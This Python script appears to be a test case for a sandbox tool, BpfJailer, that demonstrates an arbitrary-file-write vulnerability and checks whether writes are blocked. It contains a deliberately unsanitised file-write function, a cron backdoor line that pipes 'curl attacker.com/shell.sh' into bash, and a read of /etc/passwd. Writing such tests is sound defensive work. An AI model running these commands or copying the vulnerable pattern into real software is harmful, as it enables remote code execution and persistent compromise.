#!/usr/bin/env python3
"""
Vulnerable App: Arbitrary File Write

Simulates a web app that writes files based on user input.
An attacker could overwrite config files, cron jobs, or SSH keys.

ATTACK: Write to /etc/cron.d/backdoor or ~/.ssh/authorized_keys

MITIGATION:
- Role: restricted (ID 1) - Blocks all file operations
- Role: webserver (ID 3) - With file_paths limiting writes to /var/www/
- Role: isolated (ID 5) - With file_paths limiting writes to /tmp/
"""
import os
import sys

def write_user_file(user_path, user_content):
    """Vulnerable: directly writes to user-specified path"""
    # NO SANITIZATION - vulnerable to arbitrary write!
    # Attacker could write to /etc/cron.d/backdoor

    try:
        with open(user_path, 'w') as f:
            f.write(user_content)
        return True
    except Exception as e:
        return str(e)

def main():
    print("=== Arbitrary File Write Vulnerability Demo ===")
    print()

    # Test 1: Write to /tmp (should be allowed for some roles)
    print("Test 1: Write to /tmp/test_write.txt")
    sys.stdout.flush()

    try:
        test_path = "/tmp/bpfjail_test_write.txt"
        # Use low-level file operations to avoid importing tempfile
        fd = os.open(test_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o644)
        os.write(fd, b"Test write from vulnerable app\n")
        os.close(fd)
        print(f"SUCCESS - Wrote to {test_path}")
        os.remove(test_path)
    except PermissionError:
        print("BLOCKED - Permission denied (BpfJailer blocked file write)")
    except OSError as e:
        if e.errno == 13:  # EACCES
            print("BLOCKED - Permission denied (BpfJailer blocked file write)")
        else:
            print(f"ERROR - {e}")

    print()

    # Test 2: Write to sensitive location
    print("Test 2: Attempt to write cron backdoor (/etc/cron.d/)")
    sys.stdout.flush()

    try:
        # Try to write a backdoor cron job
        backdoor_content = "* * * * * root /bin/bash -c 'curl attacker.com/shell.sh | bash'\n"
        with open("/etc/cron.d/backdoor_test", 'w') as f:
            f.write(backdoor_content)
        print("SUCCESS - Wrote cron backdoor (CRITICAL!)")
        os.remove("/etc/cron.d/backdoor_test")
    except PermissionError:
        print("BLOCKED - Permission denied (BpfJailer or OS blocked write)")
    except Exception as e:
        print(f"ERROR - {e}")

    print()

    # Test 3: Overwrite application config
    print("Test 3: Attempt to read/write application config")
    sys.stdout.flush()

    try:
        with open("/etc/passwd", 'r') as f:
            content = f.read()
        print(f"SUCCESS - Read /etc/passwd ({len(content)} bytes)")
    except PermissionError:
        print("BLOCKED - Permission denied (BpfJailer blocked file read)")
    except Exception as e:
        print(f"ERROR - {e}")

if __name__ == "__main__":
    main()
